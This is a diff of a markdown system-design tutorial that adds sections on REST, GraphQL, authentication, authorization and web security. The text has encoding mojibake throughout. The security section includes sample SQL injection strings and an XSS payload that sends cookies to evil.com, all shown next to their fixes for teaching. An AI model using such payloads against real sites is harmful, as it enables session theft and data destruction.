+## 24. RESTful APIs â€” the most popular way to build APIs
+
+### What makes an API "RESTful"?
+
+**REST** stands for **Representational State Transfer** â€” a set of design rules for APIs that use plain HTTP.
+
+The core idea: **everything is a resource** (a noun â€” users, posts, orders, products). Resources live at URLs. You use HTTP verbs to say what you want to do to them.
+
+---
+
+### The resource model
+
+```
+Resource            URL
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€          â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+All users     â†’     GET  /users
+One user      â†’     GET  /users/42
+User's orders â†’     GET  /users/42/orders
+One order     â†’     GET  /users/42/orders/7
+```
+
+Then verbs say what to do:
+
+```
+GET    /users          â†’ list all users
+POST   /users          â†’ create a new user
+GET    /users/42       â†’ get user 42
+PUT    /users/42       â†’ completely replace user 42
+PATCH  /users/42       â†’ update only specific fields of user 42
+DELETE /users/42       â†’ delete user 42
+```
+
+---
+
+### A complete REST API â€” example: a blog platform
+
+```
+Articles:
+  GET    /articles                â†’ list all articles (paginated)
+  POST   /articles                â†’ create new article
+  GET    /articles/abc123         â†’ get specific article
+  PUT    /articles/abc123         â†’ replace entire article
+  PATCH  /articles/abc123         â†’ update just the title/body
+  DELETE /articles/abc123         â†’ delete article
+
+Comments on an article:
+  GET    /articles/abc123/comments        â†’ get all comments
+  POST   /articles/abc123/comments        â†’ add a comment
+  DELETE /articles/abc123/comments/7      â†’ delete comment 7
+
+Filtering and sorting:
+  GET    /articles?category=tech          â†’ filter by category
+  GET    /articles?sort=date&order=desc   â†’ sort by date, newest first
+  GET    /articles?page=2&limit=20        â†’ paginate: page 2, 20 per page
+```
+
+---
+
+### A full REST request/response example
+
+```
+Creating a new article:
+
+REQUEST:
+  POST /api/v1/articles
+  Authorization: Bearer eyJhbGci...
+  Content-Type: application/json
+
+  {
+    "title": "How TCP/IP actually works",
+    "body": "Before HTTP can do anything...",
+    "category": "networking",
+    "published": false
+  }
+
+RESPONSE (201 Created):
+  {
+    "id": "art_xyz789",
+    "title": "How TCP/IP actually works",
+    "body": "Before HTTP can do anything...",
+    "category": "networking",
+    "published": false,
+    "author_id": "usr_42",
+    "created_at": "2024-12-25T09:00:00Z"
+  }
+```
+
+---
+
+### The 6 principles of REST (in plain English)
+
+```
+1. Client-Server Separation
+   The UI (client) and the data/logic (server) are separate systems.
+   The client doesn't care how the server stores data.
+   The server doesn't care how the client displays it.
+
+2. Stateless
+   The server remembers NOTHING between requests.
+   Every request must contain all the information needed to handle it.
+   (User identity goes in a JWT or session cookie, not server memory.)
+   This is what makes horizontal scaling possible.
+
+3. Cacheable
+   Responses should say whether they can be cached.
+   GET responses are usually cacheable.
+   POST/DELETE are usually not.
+
+4. Uniform Interface
+   Consistent, predictable URLs and verbs for all resources.
+   (The GET/POST/PUT/PATCH/DELETE model we've been using.)
+
+5. Layered System
+   The client doesn't know if it's talking directly to the server,
+   or to a load balancer, CDN, or API gateway in between.
+   It doesn't need to know. The interface is the same.
+
+6. Code on Demand (optional)
+   Server can send executable code (e.g. JavaScript).
+   Rarely used in modern REST APIs.
+```
+
+---
+
+### Common REST anti-patterns â€” what NOT to do
+
+```
+âŒ Verbs in URLs:
+   GET /getUser?id=42             â†’   GET /users/42
+   POST /createOrder              â†’   POST /orders
+   POST /deleteUser?id=42         â†’   DELETE /users/42
+
+âŒ No versioning:
+   /api/users  (change this â†’ breaks every client that uses it)
+   â†’  /api/v1/users  (version it from day one)
+
+âŒ Inconsistent error format:
+   Sometimes: { "message": "not found" }
+   Sometimes: { "error": { "code": 404, "msg": "..." } }
+   Sometimes: just a 404 with no body
+   â†’  Always use the same structure
+
+âŒ Returning sensitive fields:
+   { "id": 42, "name": "Alice", "password_hash": "$2b$12$..." }
+   â†’  Never, ever include password hashes, internal flags, keys in responses
+```
+
+---
+
+## 25. GraphQL â€” fetch exactly what you need
+
+### The problem REST has
+
+Imagine a mobile app showing a user's profile page. It needs:
+
+- The user's name and profile photo
+- Their last 3 post titles (not the full content)
+- Their follower count
+
+With REST you'd make 3 separate calls:
+
+```
+Call 1: GET /users/42
+  Returns: name, photo, bio, email, settings, created_at, last_login, ...
+  (You needed name + photo â€” you got MUCH more. Over-fetching.)
+
+Call 2: GET /users/42/posts
+  Returns: 20 posts, each with full body, tags, comments count, ...
+  (You needed 3 titles â€” you got way more. Over-fetching again.)
+
+Call 3: GET /users/42/stats
+  (You had to make a whole extra call just for follower count. Under-fetching.)
+
+Problems:
+  â†’ 3 network round trips (slow on mobile)
+  â†’ Got far more data than needed (wastes bandwidth on mobile)
+```
+
+This is the **over-fetching / under-fetching problem**.
+
+---
+
+### What GraphQL does instead
+
+The client asks for exactly what it needs, in a single request:
+
+```graphql
+query UserProfile {
+  user(id: "42") {
+    name
+    photo
+    followerCount
+    recentPosts: posts(limit: 3) {
+      title
+      createdAt
+    }
+  }
+}
+```
+
+Response â€” nothing more, nothing less:
+
+```json
+{
+  "data": {
+    "user": {
+      "name": "Alice",
+      "photo": "https://cdn.example.com/alice.jpg",
+      "followerCount": 1234,
+      "recentPosts": [
+        { "title": "My first post", "createdAt": "2024-12-01" },
+        { "title": "Learning GraphQL", "createdAt": "2024-12-10" },
+        { "title": "System design tips", "createdAt": "2024-12-20" }
+      ]
+    }
+  }
+}
+```
+
+**One network call. Exactly the data you asked for.**
+
+---
+
+### How GraphQL works under the hood
+
+```mermaid
+graph LR
+    Client["ðŸ“± App"]
+    GQL["GraphQL Server\nPOST /graphql\n(single endpoint)"]
+    US["ðŸ‘¤ User\nService"]
+    PS["ðŸ“ Posts\nService"]
+    FS["ðŸ‘¥ Followers\nService"]
+
+    Client -->|"query: name + photo\n+ followerCount + 3 posts"| GQL
+    GQL -->|"fetch user"| US
+    GQL -->|"fetch last 3 posts"| PS
+    GQL -->|"fetch follower count"| FS
+    US --> GQL
+    PS --> GQL
+    FS --> GQL
+    GQL -->|"exactly what was requested"| Client
+```
+
+The GraphQL server acts as an orchestrator â€” the client just describes the shape of data it wants.
+
+---
+
+### Core GraphQL concepts
+
+```
+SCHEMA â€” the menu of everything queryable
+  Defines all available types and their fields.
+  Both client and server must agree on this.
+
+  type User {
+    id: ID!
+    name: String!
+    email: String!
+    posts: [Post!]!
+    followerCount: Int!
+  }
+
+  type Post {
+    id: ID!
+    title: String!
+    body: String!
+    createdAt: String!
+  }
+
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+
+QUERY â€” reading data (like GET in REST)
+  query {
+    user(id: "42") { name, email }
+  }
+
+MUTATION â€” changing data (like POST/PUT/DELETE in REST)
+  mutation {
+    createPost(title: "Hello!", body: "World") {
+      id
+      title
+    }
+  }
+
+SUBSCRIPTION â€” real-time updates (like WebSocket)
+  subscription {
+    newMessage(chatId: "room1") {
+      text
+      sender { name }
+    }
+  }
+```
+
+---
+
+### GraphQL vs REST â€” when to use which
+
+```
+Use GraphQL when:                    Use REST when:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€        â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+âœ… Mobile app (bandwidth matters)    âœ… Simple CRUD API
+âœ… Complex UI needs many data types  âœ… Public API (REST is easier to document)
+âœ… Frontend teams iterate fast       âœ… Simple caching (REST URLs cache easily)
+âœ… Multiple clients need different   âœ… File uploads or streaming
+   views of the same data            âœ… Small project / small team
+
+Real-world GraphQL users:            Real-world REST users:
+GitHub API, Shopify, Twitter,        Stripe, Google Maps, Twilio,
+Facebook (invented it), Airbnb       most public APIs
+```
+
+---
+
+## 26. Authentication â€” proving who you are
+
+### What is authentication?
+
+**Authentication** answers the question: _"Who are you? And can you prove it?"_
+
+When you log into an app, you prove your identity. The app then gives you a "badge" (token or session) that you show on every request, so you don't have to log in on every single click.
+
+```
+Without authentication:        With authentication:
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€      â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+Anyone accesses anything.      You prove who you are once.
+No concept of "your data".     Get a badge.
+                               Show the badge on every request.
+                               Access only your own data.
+```
+
+---
+
+### The three authentication factors
+
+```
+Factor 1 â€” Something you KNOW:
+  Password, PIN, security question answer
+
+Factor 2 â€” Something you HAVE:
+  Your phone (receives an SMS code, or runs an authenticator app)
+  A physical hardware key (YubiKey)
+
+Factor 3 â€” Something you ARE:
+  Fingerprint, Face ID, retina scan
+
+MFA (Multi-Factor Authentication) = combining any 2 of these.
+Even if an attacker steals your password, they still can't log in
+without your phone or your fingerprint.
+```
+
+---
+
+### How session-based auth works (the classic approach)
+
+```mermaid
+sequenceDiagram
+    participant U as ðŸ‘¤ User
+    participant S as ðŸ–¥ï¸ Server
+    participant DB as ðŸ—„ï¸ Session Store (Redis)
+
+    U->>S: POST /login { email, password }
+    S->>DB: Verify credentials. Create session.
+    DB-->>S: Session ID: "sess_abc123"
+    S-->>U: Set-Cookie: session_id=sess_abc123
+
+    Note over U,DB: Every subsequent request:
+    U->>S: GET /dashboard (Cookie: session_id=sess_abc123)
+    S->>DB: Is "sess_abc123" valid? Who is it?
+    DB-->>S: Valid. This is Alice (user id: 42).
+    S-->>U: Here's Alice's dashboard
+```
+
+**The catch:** The session store (Redis) must be shared across ALL your servers. If Server A creates a session, Server B also needs to find it when that user's next request lands there.
+
+---
+
+### How JWT (JSON Web Token) works â€” the modern stateless approach
+
+A JWT is a self-contained token that carries user info inside it. No database lookup needed.
+
+```
+A JWT looks like 3 parts separated by dots:
+
+eyJhbGciOiJIUzI1NiJ9  .  eyJ1c2VySWQiOjQyfQ  .  SflKxwRJSMeKKF2QT4â€¦
+       â”‚                          â”‚                         â”‚
+  Part 1: HEADER             Part 2: PAYLOAD           Part 3: SIGNATURE
+  { "alg": "HS256" }    { "userId": 42,            Hash of Part1+Part2
+  What algorithm       "email": "a@gmail.com",    using the server's
+  was used to sign?    "exp": 1735000000 }        secret key.
+                       Who is this?               If anyone tampers
+                       When does it expire?       with the payload,
+                                                  signature won't match.
+                                                  Token rejected.
+```
+
+```mermaid
+sequenceDiagram
+    participant U as ðŸ‘¤ User
+    participant S as ðŸ–¥ï¸ Server (any of them)
+
+    U->>S: POST /login { email, password }
+    S->>S: Verify credentials. Create signed JWT.
+    S-->>U: Here's your JWT token.
+
+    Note over U,S: Every subsequent request:
+    U->>S: GET /dashboard  (Authorization: Bearer <jwt>)
+    S->>S: Verify signature using secret key âœ…
+    S->>S: Check expiry timestamp âœ…
+    S-->>U: Here's Alice's dashboard
+
+    Note over S: No database lookup needed!
+    Note over S: Any server can verify the token independently.
+```
+
+**JWT pros:**
+
+- âœ… Stateless â€” works across multiple servers with no shared session store
+- âœ… Carries user info (ID, roles) inside the token itself
+- âœ… Perfect for microservices â€” just share the signing secret
+
+**JWT cons:**
+
+- âŒ Can't easily "log out" â€” the token stays valid until it expires (mitigated by short expiry + refresh tokens)
+- âŒ If stolen, attacker has full access until expiry
+- âŒ Token grows large if you add many claims
+
+---
+
+### OAuth 2.0 â€” "Login with Google / GitHub"
+
+OAuth 2.0 is the protocol behind those "Login with Google" buttons. It lets you grant a third-party app limited access to your account on another service â€” **without giving them your password**.
+
+```
+Example: Logging into Spotify with your Facebook account
+
+1. You click "Login with Facebook" on Spotify.
+
+2. Spotify redirects you to Facebook:
+   "Spotify wants to read your name and email. Allow?"
+
+3. You log in to Facebook directly. (Spotify never sees your password.)
+
+4. Facebook gives Spotify a limited access token.
+
+5. Spotify uses that token to read your name and email only.
+
+6. You're logged in. Spotify has your identity without ever
+   knowing your Facebook password.
+```
+
+```mermaid
+sequenceDiagram
+    participant U as ðŸ‘¤ You
+    participant APP as ðŸ“± Spotify (App)
+    participant AUTH as ðŸ” Facebook (Auth Server)
+    participant RS as ðŸ“‹ Facebook (Resource Server)
+
+    U->>APP: "Login with Facebook"
+    APP->>AUTH: Redirect: "User wants to login. My app ID is xyz."
+    AUTH->>U: "Spotify wants your name + email. Allow?"
+    U->>AUTH: "Allow"
+    AUTH->>APP: Authorization Code: "code_abc"
+    APP->>AUTH: Exchange code for access token (server-side, secure)
+    AUTH->>APP: Access Token: "tok_xyz"
+    APP->>RS: GET /me (Authorization: Bearer tok_xyz)
+    RS->>APP: { name: "Alice", email: "alice@fb.com" }
+    APP->>U: You're logged in as Alice!
+```
+
+---
+
+## 27. Authorization â€” what you're allowed to do
+
+### Authentication vs Authorization â€” not the same thing
+
+People confuse these constantly. They are completely different:
+
+```
+Authentication = "Who are you?"
+  â†’ Verifying identity. Are you who you claim to be?
+  â†’ "Show me your ID card."
+
+Authorization = "What are you allowed to do?"
+  â†’ Checking permissions. What can this person access?
+  â†’ "Your ID is valid, but you don't have clearance for Floor 5."
+
+Example:
+  You log into a company app.      â† Authentication âœ…
+  You try to view HR salary data.
+  You're a developer, not HR.      â† Authorization âŒ â€” Access denied.
+```
+
+---
+
+### Role-Based Access Control (RBAC) â€” the most common model
+
+Assign users to **roles**, define what each role can do.
+
+```mermaid
+graph LR
+    Alice["ðŸ‘¤ Alice"]
+    Bob["ðŸ‘¤ Bob"]
+    Carol["ðŸ‘¤ Carol"]
+
+    AdminRole["ðŸ›¡ï¸ Admin Role"]
+    EditorRole["âœï¸ Editor Role"]
+    ViewerRole["ðŸ‘ï¸ Viewer Role"]
+
+    CanDelete["ðŸ—‘ï¸ Delete content"]
+    CanWrite["âœï¸ Write content"]
+    CanRead["ðŸ“– Read content"]
+    ManageUsers["ðŸ‘¥ Manage users"]
+
+    Alice --> AdminRole
+    Bob --> EditorRole
+    Carol --> ViewerRole
+
+    AdminRole --> CanDelete
+    AdminRole --> CanWrite
+    AdminRole --> CanRead
+    AdminRole --> ManageUsers
+
+    EditorRole --> CanWrite
+    EditorRole --> CanRead
+
+    ViewerRole --> CanRead
+```
+
+---
+
+### Attribute-Based Access Control (ABAC) â€” finer grained
+
+RBAC gives access based on role. ABAC gives access based on **attributes** â€” much more flexible.
+
+```
+ABAC rules use attributes like:
+
+  User attributes:     department, level, location, clearance
+  Resource attributes: classification, owner, file type
+  Environment:         time of day, IP address, device type
+
+Example rules:
+  "Allow access IF user.department = 'Finance'
+                AND resource.type = 'salary_report'
+                AND time BETWEEN 9am AND 6pm"
+
+  "Allow access IF user.clearance >= resource.required_clearance"
+
+  "Allow access IF user.country = resource.data_residency_region"
+  (useful for GDPR compliance)
+```
+
+---
+
+### Authorization in practice â€” using JWT claims
+
+When a user logs in and gets a JWT, the token can carry their **roles and permissions**:
+
+```json
+{
+  "userId": 42,
+  "email": "alice@company.com",
+  "roles": ["admin", "editor"],
+  "permissions": ["articles:write", "articles:delete", "users:manage"],
+  "department": "Engineering",
+  "exp": 1735000000
+}
+```
+
+When Alice tries to delete an article:
+
+```
+Server receives: DELETE /articles/123
+Token says:      roles: ["admin", "editor"]
+Server checks:   "Does 'admin' or 'editor' have delete permission?"
+Answer:          Admin does â†’ Allow âœ…
+```
+
+No database call needed for the authorization check â€” the JWT already carries the answer.
+
+---
+
+### Principle of Least Privilege â€” the golden rule
+
+> **Give every user, service, and process only the permissions they absolutely need to do their job. Nothing more.**
+
+```
+Bad practice:
+  Every developer has production database admin access.
+  â†’ One compromised developer account = full database access = catastrophe.
+
+Good practice:
+  Developers have read-only access to logs.
+  They request temporary elevated access when needed.
+  Access is logged and auto-expires after 1 hour.
+  â†’ Compromised account has very limited blast radius.
+```
+
+This applies to services too:
+
+- Your image-resizing service should only access the image bucket â€” not the whole S3 account
+- Your email service should only be able to send emails â€” not read the database
+- Your reporting service should have read-only database access â€” never write access
+
+---
+
+## 28. Security â€” keeping the bad guys out
+
+Security isn't one thing â€” it's a collection of practices across every layer of your system.
+
+---
+
+### HTTPS â€” encrypting everything in transit
+
+Every app should use HTTPS (HTTP with TLS encryption). Without it, anyone on the same network can read your traffic.
+
+```
+Without HTTPS (plain HTTP):
+  Your browser sends:   POST /login { "password": "hunter2" }
+                                      â†“
+  Travels over the network unencrypted
+                                      â†“
+  Anyone on the same WiFi can read:   "password": "hunter2"  âŒ
+
+With HTTPS (TLS encrypted):
+  Your browser sends:   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  (looks like garbage)
+                                      â†“
+  Network sees:         â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  (can't read it)
+                                      â†“
+  Only the server has the private key to decrypt it  âœ…
+```
+
+TLS works by having the server prove its identity (via an SSL certificate), then both sides negotiate a shared encryption key â€” without ever sending that key over the wire.
+
+---
+
+### SQL Injection â€” sneaking commands into your database
+
+```
+Your app runs: SELECT * FROM users WHERE email = '[user input]'
+
+Normal user types:    alice@gmail.com
+Your query becomes:   SELECT * FROM users WHERE email = 'alice@gmail.com'  âœ…
+
+Attacker types:       ' OR '1'='1
+Your query becomes:   SELECT * FROM users WHERE email = '' OR '1'='1'
+                                                               ^^^^^^^^^^^
+                                                               Always true!
+                      â†’ Returns ALL users in the database  âŒ
+
+Attacker types:       '; DROP TABLE users; --
+Your query becomes:   ... email = ''; DROP TABLE users; --'
+                                       ^^^^^^^^^^^^^^^^^^^
+                                       Deletes your entire users table!  âŒ
+```
+
+**Fix: Use parameterised queries. Always.**
+
+```python
+# DANGEROUS â€” never do this:
+query = f"SELECT * FROM users WHERE email = '{user_input}'"
+
+# SAFE â€” always do this:
+query = "SELECT * FROM users WHERE email = ?"
+cursor.execute(query, [user_input])
+# The input is treated as data, never as code.
+```
+
+---
+
+### XSS â€” Cross-Site Scripting
+
+An attacker injects malicious JavaScript into your page, which then runs in other users' browsers.
+
+```
+Your site shows user comments. Comment stored like:
+  <div class="comment">Great article!</div>
+
+Attacker posts this "comment":
+  <script>fetch('https://evil.com/?c='+document.cookie)</script>
+
+Your site renders it as actual HTML. When anyone views the page:
+  â†’ Their browser runs the attacker's script
+  â†’ Their session cookies get sent to evil.com
+  â†’ Attacker can now log in as every user who viewed that page  âŒ
+```
+
+**Fix:** Always escape/encode user-provided content before rendering it as HTML. Libraries like React, Vue, and Angular do this automatically. Never use `.innerHTML` with untrusted data.
+
+---
+
+### Broken Authentication â€” weak login systems
+
+Common mistakes:
+
+```
+âŒ Passwords stored as plain text (or weak hash like MD5)
+âŒ No account lockout after many failed attempts
+   â†’ Lets attackers try millions of passwords (brute force)
+âŒ Session tokens that never expire
+âŒ Predictable session IDs (sequential numbers, timestamps)
+âŒ No rate limiting on the login endpoint
+
+âœ… Fixes:
+  Hash passwords with bcrypt or Argon2 (not MD5 or SHA1)
+  Lock accounts after 5 failed attempts (with exponential backoff)
+  JWT tokens expire in 15 minutes (use refresh tokens for long sessions)
+  Rate limit login: max 5 attempts per minute per IP
+  Use MFA for sensitive accounts
+```
+
+---
+
+### Sensitive Data Exposure â€” accidentally leaking private info
+
+```
+Bad API response:
+{
+  "id": 42,
+  "name": "Alice",
+  "email": "alice@gmail.com",
+  "password_hash": "$2b$12$abc...",   â† NEVER return this
+  "credit_card": "4111111111111111",   â† NEVER return this
+  "internal_admin_flag": true,         â† should not exist in response
+  "ssn": "123-45-6789"                 â† absolutely not
+}
+
+Good API response:
+{
+  "id": 42,
+  "name": "Alice",
+  "email": "alice@gmail.com"
+  (only what the client actually needs for this endpoint)
+}
+```
+
+**Fix:** Each API endpoint should return a DTO (Data Transfer Object) shaped specifically for that endpoint â€” not the raw database row.
+
+---
+
+### Security Misconfiguration â€” the most avoidable vulnerabilities
+
+```
+Common misconfigurations:
+  âŒ Default admin credentials not changed (admin / admin)
+  âŒ Debug mode left on in production (exposes stack traces and internals)
+  âŒ S3 buckets set to public when they should be private
+  âŒ Unnecessary ports left open (SSH from the whole internet)
+  âŒ Error messages that show database column names or file paths
+  âŒ Old, vulnerable library versions not updated
+
+Fixes:
+  âœ… Security checklist before every deployment
+  âœ… Automated vulnerability scanning in CI/CD (npm audit, Dependabot)
+  âœ… Error messages show only what's useful to the user â€” never internals
+  âœ… Least privilege for every service and config (not "open everything")
+```
+
+---
+
+### The security checklist â€” a quick reference
+
+```
+Authentication:
+  â˜ Passwords hashed with bcrypt or Argon2 (never MD5, never plain text)
+  â˜ Account lockout after failed attempts + rate limiting on login
+  â˜ JWT tokens have short expiry (15 min to 1 hour)
+  â˜ Refresh tokens rotated on each use
+  â˜ MFA available for sensitive accounts
+
+Data protection:
+  â˜ HTTPS everywhere (force redirect from HTTP â†’ HTTPS)
+  â˜ Sensitive data encrypted at rest (database-level encryption)
+  â˜ API returns only the fields needed for each endpoint
+  â˜ No secrets hardcoded in source code (use env vars or a secrets manager)
+
+Input handling:
+  â˜ Parameterised queries everywhere (zero SQL concatenation)
+  â˜ All user input escaped/encoded before rendering in HTML
+  â˜ File upload validation (check actual file type, not just extension)
+  â˜ Request size limits (reject payloads over a few MB)
+
+Infrastructure:
+  â˜ No default credentials left unchanged
+  â˜ Firewall: only required ports open
+  â˜ Regular dependency updates
+  â˜ Container images scanned for CVEs before deployment
+
+Monitoring:
+  â˜ Log all auth events (successful logins, failures, logouts)
+  â˜ Alert on suspicious patterns (100 failed logins in a minute)
+  â˜ Audit log for sensitive actions (who accessed what, when)
+```
+
+---
+
 ```
 â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
 â•‘                                                               â•‘
@@ -2305,886 +3259,6 @@ to ask "are you available?"          when they're free
 â•‘                                                               â•‘
 â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 ```
-
----
-
-_Part of the AI_Projects learning series._
-2. [The Building Blocks](#2-the-building-blocks)
-3. [Scalability â€” how do you grow?](#3-scalability--how-do-you-grow)
-4. [Availability â€” how do you stay up?](#4-availability--how-do-you-stay-up)
-5. [CAP Theorem â€” the impossible triangle](#5-cap-theorem--the-impossible-triangle)
-6. [Databases â€” choosing the right storage](#6-databases--choosing-the-right-storage)
-7. [Caching â€” stop asking the same question twice](#7-caching--stop-asking-the-same-question-twice)
-8. [Load Balancers â€” the traffic cops](#8-load-balancers--the-traffic-cops)
-9. [CDN â€” the world is big, servers are slow](#9-cdn--the-world-is-big-servers-are-slow)
-10. [Message Queues â€” don't do things right now](#10-message-queues--dont-do-things-right-now)
-11. [API Gateway â€” the front door](#11-api-gateway--the-front-door)
-12. [Rate Limiting â€” slowing down the greedy](#12-rate-limiting--slowing-down-the-greedy)
-13. [Database Sharding â€” cutting the data pie](#13-database-sharding--cutting-the-data-pie)
-14. [Replication â€” keeping backups alive](#14-replication--keeping-backups-alive)
-15. [Microservices vs Monolith](#15-microservices-vs-monolith)
-16. [Real World Examples](#16-real-world-examples)
-17. [The System Design Interview Playbook](#17-the-system-design-interview-playbook)
-
----
-
-## 1. What even is System Design?
-
-Imagine you're building a food delivery app. Day 1: just you and your friends use it. One server, one database, everything is fine.
-
-Now imagine 10 million people use it on New Year's Eve at the same time. What happens?
-
-- Your one server catches fire (figuratively)
-- Your database can't answer 10 million questions per second
-- One bug takes your entire app down
-- Someone in Australia is waiting 8 seconds for a page to load because your server is in New York
-
-**System design is the art of deciding in advance how your system will handle all of this â€” before it happens.**
-
-```
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚                         YOUR APP                                â”‚
-â”‚                                                                  â”‚
-â”‚   Small scale              vs           Large scale             â”‚
-â”‚                                                                  â”‚
-â”‚   1 user  â†’  1 server         1M users â†’ ???                    â”‚
-â”‚   1 DB    â†’  simple           multiple DBs, caches, queues      â”‚
-â”‚   1 team  â†’  knows it all     100 teams â†’ microservices         â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-```
-
----
-
-## 2. The Building Blocks
-
-Every large system is built from the same set of Lego bricks. Know these, and you can design almost anything.
-
-```mermaid
-graph TD
-    User["ðŸ‘¤ User / Browser / App"]
-    DNS["ðŸŒ DNS\n(Finds the address)"]
-    CDN["ðŸ“¦ CDN\n(Nearby static files)"]
-    LB["âš–ï¸ Load Balancer\n(Splits traffic)"]
-    API["ðŸšª API Gateway\n(Front door)"]
-    S1["ðŸ–¥ï¸ Server 1"]
-    S2["ðŸ–¥ï¸ Server 2"]
-    S3["ðŸ–¥ï¸ Server 3"]
-    Cache["âš¡ Cache\n(Fast answers)"]
-    DB["ðŸ—„ï¸ Primary Database"]
-    DBR["ðŸ—„ï¸ Replica DB\n(Read only)"]
-    Queue["ðŸ“¬ Message Queue\n(Jobs to do later)"]
-    Worker["âš™ï¸ Worker / Background job"]
-
-    User -->|"types URL"| DNS
-    User -->|"static files"| CDN
-    DNS -->|"IP address"| LB
-    LB --> API
-    API --> S1
-    API --> S2
-    API --> S3
-    S1 --> Cache
-    S2 --> Cache
-    S3 --> Cache
-    Cache -->|"cache miss"| DB
-    DB --> DBR
-    S1 --> Queue
-    Queue --> Worker
-    Worker --> DB
-```
-
-| Block                       | What it does                                                                                | Real-world example                                                |
-| --------------------------- | ------------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
-| **DNS**                     | Converts `google.com` into an IP address your computer can actually connect to              | Like a phone book â€” name â†’ number                                 |
-| **Load Balancer**           | Spreads requests across multiple servers so no single one gets overwhelmed                  | A restaurant manager seating customers across all tables          |
-| **CDN**                     | Keeps copies of your static files (images, videos, CSS) in servers close to users worldwide | Netflix serving videos from a server in your city, not California |
-| **Cache**                   | Stores answers to common questions in fast memory so you don't hit the database every time  | Post-its on your desk vs going to the filing room                 |
-| **Database**                | Persistent storage â€” data lives here even when the server restarts                          | The actual filing room                                            |
-| **Message Queue**           | A to-do list for your system â€” tasks get added and processed in order, at their own pace    | A ticket queue at a help desk                                     |
-| **API Gateway**             | Single entry point for all incoming requests â€” handles auth, routing, rate limiting         | Reception at an office building                                   |
-| **Worker / Background job** | Picks up tasks from the queue and does them slowly (sending emails, processing images)      | The people who actually handle each ticket                        |
-
----
-
-## 3. Scalability â€” how do you grow?
-
-Scalability is your system's ability to handle more load without falling over.
-
-There are exactly two ways to scale:
-
-### Vertical Scaling â€” make the machine bigger
-
-Buy a beefier server. More CPU, more RAM, more disk.
-
-```
-Before:                After:
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ Server   â”‚  â”€â”€â”€â”€â”€â”€â–º â”‚ BIGGER Server    â”‚
-â”‚ 4 cores  â”‚          â”‚ 64 cores         â”‚
-â”‚ 8GB RAM  â”‚          â”‚ 512GB RAM        â”‚
-â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
-```
-
-âœ… Simple â€” no code changes needed  
-âœ… Works well up to a point  
-âŒ Has a hard ceiling â€” you can only make a machine so big  
-âŒ Single point of failure â€” if this one machine dies, everything dies  
-âŒ Expensive â€” high-end hardware costs exponentially more
-
----
-
-### Horizontal Scaling â€” add more machines
-
-Instead of making one server bigger, add more servers and split the load.
-
-```
-Before:                After:
-â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
-â”‚ Server   â”‚  â”€â”€â”€â”€â”€â”€â–º â”‚ Server 1 â”‚  â”‚ Server 2 â”‚  â”‚ Server 3 â”‚
